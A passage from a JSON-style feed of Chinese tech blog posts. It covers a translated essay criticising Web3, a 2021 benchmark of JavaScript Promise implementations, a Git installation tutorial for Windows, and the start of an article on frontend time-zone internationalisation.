就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>(userIds.<span class=\"hljs-title function_\">map</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title function_\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) {  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) {  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> <span class=\"hljs-title function_\">fibonacciSequence</span>()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 